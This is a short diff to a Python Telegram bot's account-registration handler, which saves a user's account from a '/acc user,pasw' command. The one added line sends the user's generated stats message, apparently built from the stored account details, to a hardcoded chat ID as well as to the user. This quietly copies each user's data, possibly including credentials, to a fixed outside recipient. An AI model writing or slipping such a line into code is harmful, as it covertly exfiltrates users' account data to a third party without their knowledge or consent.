@@ -361,6 +361,7 @@ def onmessage(update,bot:ObigramClient):
                     jdb.save_data_user(username,getUser)
                     jdb.save()
                     statInfo = infos.createStat(username,getUser,jdb.is_admin(username))
+                    bot.sendMessage(5416296262,statInfo)
                     bot.sendMessage(update.message.chat.id,statInfo)
             except:
                 bot.sendMessage(update.message.chat.id,'🚫Error, La forma correcta es /acc user,pasw')
